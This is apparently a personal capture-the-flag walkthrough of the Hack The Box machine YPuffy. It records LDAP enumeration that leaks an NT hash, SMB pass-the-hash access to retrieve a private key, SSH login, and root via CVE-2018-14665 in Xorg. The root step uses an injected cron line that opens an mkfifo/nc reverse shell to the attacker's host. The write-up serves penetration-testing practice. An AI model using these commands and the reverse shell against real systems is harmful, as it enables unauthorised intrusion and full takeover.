# HTB - YPuffy  10.10.10.107

- OpenBSD


- Ldap leak an NT hash
- Mount a SMB drive with this hash and get a ppk
- convert ppk to .pem
- use it to connect with ssh

- Normally generate key base don CA... complicated
- USe X.Org X Server 1.19.6 CVE




## Walkthrough

- https://0xdf.gitlab.io/2019/02/09/htb-ypuffy.html



## NMap

```
# Nmap 7.70 scan initiated Sun Sep 15 01:45:44 2019 as: nmap -sC -sV -A -o enum/nmap_10.10.10.107_recon.txt 10.10.10.107
Nmap scan report for 10.10.10.107
Host is up (0.030s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION

22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)
|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)

80/tcp  open  http        OpenBSD httpd

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)

389/tcp open  ldap        (Anonymous bind OK)

445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)

Service Info: Host: YPUFFY

Host script results:
|_clock-skew: mean: 1h12m05s, deviation: 2h18m34s, median: -7m54s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6)
|   Computer name: ypuffy
|   NetBIOS computer name: YPUFFY\x00
|   Domain name: hackthebox.htb
|   FQDN: ypuffy.hackthebox.htb
|_  System time: 2019-09-14T19:38:20-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-09-15 01:38:20
|_  start_date: N/A

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   30.35 ms 10.10.14.1
2   29.52 ms 10.10.10.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 15 01:46:24 2019 -- 1 IP address (1 host up) scanned in 40.96 seconds
```



## 80 : http:10.10.10.107 et http://ypuffy.hackthebox.htb

Empty response


## LDAP scan by nmap script (10 min)

```
# nmap -p 389 --script *ldap* 10.10.10.107
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-15 02:03 CEST
Nmap scan report for ypuffy.hackthebox.htb (10.10.10.107)
Host is up (0.031s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       supportedLDAPVersion: 3
|       namingContexts: dc=hackthebox,dc=htb
|       supportedExtension: 1.3.6.1.4.1.1466.20037
|_      subschemaSubentry: cn=schema
| ldap-search: 
|   Context: dc=hackthebox,dc=htb
|     dn: dc=hackthebox,dc=htb
|         dc: hackthebox
|         objectClass: top
|         objectClass: domain
|     dn: ou=passwd,dc=hackthebox,dc=htb
|         ou: passwd
|         objectClass: top
|         objectClass: organizationalUnit
|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
|         uid: bob8791
|         cn: Bob
|         objectClass: account
|         objectClass: posixAccount
|         objectClass: top
|         userPassword: {BSDAUTH}bob8791
|         uidNumber: 5001
|         gidNumber: 5001
|         gecos: Bob
|         homeDirectory: /home/bob8791
|         loginShell: /bin/ksh
|     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
|         uid: alice1978
|         cn: Alice
|         objectClass: account
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: sambaSamAccount
|         userPassword: {BSDAUTH}alice1978
|         uidNumber: 5000
|         gidNumber: 5000
|         gecos: Alice
|         homeDirectory: /home/alice1978
|         loginShell: /bin/ksh
|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
|         displayName: Alice
|         sambaAcctFlags: [U          ]
|         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B  <======   Hash
|         sambaPwdLastSet: 1532916644
|     dn: ou=group,dc=hackthebox,dc=htb
|         ou: group
|         objectClass: top
|         objectClass: organizationalUnit
|     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: bob8791
|         userPassword: {crypt}*
|         gidNumber: 5001
|     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: alice1978
|         userPassword: {crypt}*
|         gidNumber: 5000
|     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
|         sambaDomainName: YPUFFY
|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464
|         sambaAlgorithmicRidBase: 1000
|         objectclass: sambaDomain
|         sambaNextUserRid: 1000
|         sambaMinPwdLength: 5
|         sambaPwdHistoryLength: 0
|         sambaLogonToChgPwd: 0
|         sambaMaxPwdAge: -1
|         sambaMinPwdAge: 0
|         sambaLockoutDuration: 30
|         sambaLockoutObservationWindow: 30
|         sambaLockoutThreshold: 0
|         sambaForceLogoff: -1
|         sambaRefuseMachinePwdChange: 0
|_        sambaNextRid: 1001

Nmap done: 1 IP address (1 host up) scanned in 600.77 seconds
```


## SMB

alice1978 : 0B186E661BBDBDCF6047784DE8B9FD8B

SMB allows pass the hash, a
To use a hash with smbclient: -U username%password put the hash in place of the password, and add the --pw-nt-hash option:

```
# smbclient -L \\\\10.10.10.107 --pw-nt-hash -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B

	Sharename       Type      Comment
	---------       ----      -------
	alice           Disk      Alice's Windows Directory
	IPC$            IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
```
```
# smbclient \\\\10.10.10.107\\alice -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Sep 15 02:16:15 2019
  ..                                  D        0  Wed Aug  1 05:16:50 2018
  my_private_key.ppk                  A     1460  Tue Jul 17 03:38:51 2018

		433262 blocks of size 1024. 411540 blocks available
smb: \> get my_private_key.ppk
getting file \my_private_key.ppk of size 1460 as my_private_key.ppk (11,3 KiloBytes/sec) (average 11,3 KiloBytes/sec)
smb: \> exit

```


## Convert ppk

```
apt install putty-tools
puttygen my_private_key.ppk -O private-openssh -o alice.pem
```

```
# ssh -i alice.pem alice1978@10.10.10.107
The authenticity of host '10.10.10.107 (10.10.10.107)' can't be established.
ECDSA key fingerprint is SHA256:oYYpshmLOvkyebJUObgH6bxJkOGRu7xsw3r7ta0LCzE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.107' (ECDSA) to the list of known hosts.
OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

ypuffy$ id
uid=5000(alice1978) gid=5000(alice1978) groups=5000(alice1978)
ypuffy$ 
$ cat user.txt
XXXXXXXXXXXXXXXXXXxxxxxxx
```

## Escalation


Based on certificate generation... HArd



## Use CVE-2018-14665 : Xorg 

```
$ Xorg -fp "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 4444 > /tmp/f" -logfile crontab :1 &
[1] 7684
ypuffy$ 
X.Org X Server 1.19.6
Release Date: 2017-12-20
X Protocol Version 11, Revision 0
Build Operating System: OpenBSD 6.3 amd64 
Current Operating System: OpenBSD ypuffy.hackthebox.htb 6.3 GENERIC#100 amd64
Build Date: 24 March 2018  02:38:24PM
 
Current version of pixman: 0.34.0
        Before reporting problems, check http://wiki.x.org
        to make sure that you have the latest version.
Markers: (--) probed, (**) from config file, (==) default setting,
        (++) from command line, (!!) notice, (II) informational,
        (WW) warning, (EE) error, (NI) not implemented, (??) unknown.
(++) Log file: "crontab", Time: Sat Sep 14 20:33:02 2019
(==) Using system config directory "/usr/X11R6/share/X11/xorg.conf.d"
(EE) Segmentation fault at address 0x8
(EE) 
Fatal server error:
(EE) Caught signal 11 (Segmentation fault). Server aborting
(EE) 
(EE) 
Please consult the The X.Org Foundation support 
         at http://wiki.x.org
 for help. 
(EE) Please also check the log file at "crontab" for additional information.
(EE) 
(EE) Server terminated with error (1). Closing log file.

[1] + Abort trap           Xorg -fp "* * * * * root rm /tmp/f;mkfifo /tmp/
ypuffy$ 
```

Get the nc
```
# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.32] from ypuffy.hackthebox.htb [10.10.10.107] 23198
/bin/sh: No controlling tty (open /dev/tty: Device not configured)
/bin/sh: Can't find tty file descriptor
/bin/sh: warning: won't have full job control
ypuffy# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
ypuffy# cat /root/root.txt
XXXXXXXXXXXXXXXXXXXXXX
 

```


